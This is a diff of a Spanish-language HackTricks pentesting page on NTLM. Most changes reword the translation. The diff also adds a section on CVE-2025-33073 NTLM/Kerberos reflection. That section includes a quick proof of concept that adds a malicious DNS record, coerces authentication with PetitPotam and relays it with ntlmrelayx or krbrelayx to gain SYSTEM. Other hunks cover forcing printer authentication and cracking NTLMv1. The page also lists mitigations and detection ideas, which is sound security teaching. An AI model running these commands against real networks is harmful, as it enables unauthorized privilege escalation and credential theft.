@@ -2,6 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+
 ## Información Básica
 
 En entornos donde **Windows XP y Server 2003** están en operación, se utilizan hashes LM (Lan Manager), aunque se reconoce ampliamente que estos pueden ser fácilmente comprometidos. Un hash LM particular, `AAD3B435B51404EEAAD3B435B51404EE`, indica un escenario donde LM no se emplea, representando el hash para una cadena vacía.
@@ -15,7 +16,7 @@ El soporte para los protocolos de autenticación - LM, NTLMv1 y NTLMv2 - es faci
 **Puntos Clave**:
 
 - Los hashes LM son vulnerables y un hash LM vacío (`AAD3B435B51404EEAAD3B435B51404EE`) significa su no uso.
-- Kerberos es el método de autenticación por defecto, con NTLM utilizado solo bajo ciertas condiciones.
+- Kerberos es el método de autenticación predeterminado, con NTLM utilizado solo bajo ciertas condiciones.
 - Los paquetes de autenticación NTLM son identificables por el encabezado "NTLMSSP".
 - Los protocolos LM, NTLMv1 y NTLMv2 son soportados por el archivo del sistema `msv1\_0.dll`.
 
@@ -77,11 +78,11 @@ El **hash NT (16bytes)** se divide en **3 partes de 7bytes cada una** (7B + 7B +
 
 Hoy en día es cada vez menos común encontrar entornos con Delegación No Restringida configurada, pero esto no significa que no puedas **abusar de un servicio de Print Spooler** configurado.
 
-Podrías abusar de algunas credenciales/sesiones que ya tienes en el AD para **pedir a la impresora que se autentique** contra algún **host bajo tu control**. Luego, usando `metasploit auxiliary/server/capture/smb` o `responder` puedes **establecer el reto de autenticación a 1122334455667788**, capturar el intento de autenticación, y si se realizó usando **NTLMv1** podrás **crackearlo**.\
-Si estás usando `responder` podrías intentar **usar la bandera `--lm`** para intentar **reducir** la **autenticación**.\
+Podrías abusar de algunas credenciales/sesiones que ya tienes en el AD para **pedir a la impresora que se autentique** contra algún **host bajo tu control**. Luego, usando `metasploit auxiliary/server/capture/smb` o `responder` puedes **configurar el reto de autenticación a 1122334455667788**, capturar el intento de autenticación, y si se realizó usando **NTLMv1** podrás **crackearlo**.\
+Si estás usando `responder` podrías intentar **usar la bandera `--lm`** para intentar **degradar** la **autenticación**.\
 _Ten en cuenta que para esta técnica la autenticación debe realizarse usando NTLMv1 (NTLMv2 no es válido)._
 
-Recuerda que la impresora usará la cuenta de computadora durante la autenticación, y las cuentas de computadora utilizan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** usando diccionarios comunes. Pero la **autenticación NTLMv1** **usa DES** ([más información aquí](#ntlmv1-challenge)), así que usando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com) por ejemplo).
+Recuerda que la impresora usará la cuenta de computadora durante la autenticación, y las cuentas de computadora utilizan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** usando diccionarios comunes. Pero la autenticación **NTLMv1** **usa DES** ([más información aquí](#ntlmv1-challenge)), así que usando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) o [https://ntlmv1.com/](https://ntlmv1.com) por ejemplo).
 
 ### Ataque NTLMv1 con hashcat
 
@@ -135,7 +136,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-Ahora necesitamos usar las hashcat-utilities para convertir las claves des descifradas en partes del hash NTLM:
+Ahora necesitamos usar las utilidades de hashcat para convertir las claves des descifradas en partes del hash NTLM:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -242,7 +243,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 El Ataque de Monólogo Interno es una técnica sigilosa de extracción de credenciales que permite a un atacante recuperar hashes NTLM de la máquina de una víctima **sin interactuar directamente con el proceso LSASS**. A diferencia de Mimikatz, que lee hashes directamente de la memoria y es frecuentemente bloqueado por soluciones de seguridad de endpoint o Credential Guard, este ataque aprovecha **llamadas locales al paquete de autenticación NTLM (MSV1_0) a través de la Interfaz de Proveedor de Soporte de Seguridad (SSPI)**. El atacante primero **reduce la configuración de NTLM** (por ejemplo, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) para asegurarse de que se permita NetNTLMv1. Luego, impersona tokens de usuario existentes obtenidos de procesos en ejecución y activa la autenticación NTLM localmente para generar respuestas NetNTLMv1 utilizando un desafío conocido.
 
-Después de capturar estas respuestas NetNTLMv1, el atacante puede recuperar rápidamente los hashes NTLM originales utilizando **tablas arcoíris precomputadas**, lo que permite ataques de Pass-the-Hash para movimiento lateral. Crucialmente, el Ataque de Monólogo Interno permanece sigiloso porque no genera tráfico de red, inyecta código ni activa volcado de memoria directa, lo que lo hace más difícil de detectar para los defensores en comparación con métodos tradicionales como Mimikatz.
+Después de capturar estas respuestas NetNTLMv1, el atacante puede recuperar rápidamente los hashes NTLM originales utilizando **tablas arcoíris precomputadas**, lo que permite ataques adicionales de Pass-the-Hash para movimiento lateral. Crucialmente, el Ataque de Monólogo Interno permanece sigiloso porque no genera tráfico de red, inyecta código ni activa volcado de memoria directa, lo que lo hace más difícil de detectar para los defensores en comparación con métodos tradicionales como Mimikatz.
 
 Si NetNTLMv1 no es aceptado—debido a políticas de seguridad impuestas, el atacante puede no lograr recuperar una respuesta NetNTLMv1.
 
@@ -250,9 +251,10 @@ Para manejar este caso, la herramienta de Monólogo Interno fue actualizada: Adq
 
 El PoC se puede encontrar en **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.
 
-## Reenvío NTLM y Responder
+## NTLM Relay y Responder
 
 **Lee una guía más detallada sobre cómo realizar esos ataques aquí:**
+
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
@@ -261,5 +263,51 @@ El PoC se puede encontrar en **[https://github.com/eladshamir/Internal-Monologue
 ## Analizar desafíos NTLM de una captura de red
 
 **Puedes usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+
+## NTLM y Kerberos *Reflejo* a través de SPNs Serializados (CVE-2025-33073)
+
+Windows contiene varias mitigaciones que intentan prevenir ataques de *reflejo* donde una autenticación NTLM (o Kerberos) que se origina de un host es retransmitida de vuelta al **mismo** host para obtener privilegios de SYSTEM.
+
+Microsoft rompió la mayoría de las cadenas públicas con MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) y parches posteriores, sin embargo **CVE-2025-33073** muestra que las protecciones aún pueden ser eludidas abusando de cómo el **cliente SMB trunca los Nombres de Principales de Servicio (SPNs)** que contienen información de destino *marshalled* (serializada).
+
+### Resumen del error
+1. Un atacante registra un **registro A de DNS** cuyo etiqueta codifica un SPN marshalled – por ejemplo,
+`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
+2. La víctima es forzada a autenticarse a ese nombre de host (PetitPotam, DFSCoerce, etc.).
+3. Cuando el cliente SMB pasa la cadena de destino `cifs/srv11UWhRCAAAAA…` a `lsasrv!LsapCheckMarshalledTargetInfo`, la llamada a `CredUnmarshalTargetInfo` **elimina** el blob serializado, dejando **`cifs/srv1`**.
+4. `msv1_0!SspIsTargetLocalhost` (o el equivalente de Kerberos) ahora considera que el objetivo es *localhost* porque la parte corta del host coincide con el nombre de la computadora (`SRV1`).
+5. En consecuencia, el servidor establece `NTLMSSP_NEGOTIATE_LOCAL_CALL` e inyecta **el token de acceso de SYSTEM de LSASS** en el contexto (para Kerberos se crea una clave de subsesión marcada como SYSTEM).
+6. Retransmitir esa autenticación con `ntlmrelayx.py` **o** `krbrelayx.py` otorga derechos completos de SYSTEM en el mismo host.
+
+### PoC rápida
+```bash
+# Add malicious DNS record
+dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
+-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
+-d 10.10.10.50
+
+# Trigger authentication
+PetitPotam.py -u user -p pass -d DOMAIN \
+srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL
+
+# Relay listener (NTLM)
+ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
+
+# Relay listener (Kerberos) – remove NTLM mechType first
+krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
+```
+### Patches y Mitigaciones
+* El parche KB para **CVE-2025-33073** añade una verificación en `mrxsmb.sys::SmbCeCreateSrvCall` que bloquea cualquier conexión SMB cuyo objetivo contenga información marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
+* Habilitar **SMB signing** para prevenir la reflexión incluso en hosts no parcheados.
+* Monitorear registros DNS que se asemejen a `*<base64>...*` y bloquear vectores de coerción (PetitPotam, DFSCoerce, AuthIP...).
+
+### Ideas de detección
+* Capturas de red con `NTLMSSP_NEGOTIATE_LOCAL_CALL` donde la IP del cliente ≠ la IP del servidor.
+* Kerberos AP-REQ que contenga una clave de subsesión y un principal de cliente igual al nombre del host.
+* Inicios de sesión del sistema Windows Event 4624/4648 seguidos inmediatamente por escrituras SMB remotas desde el mismo host.
+
+## Referencias
+* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
+* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
 
 {{#include ../../banners/hacktricks-training.md}}
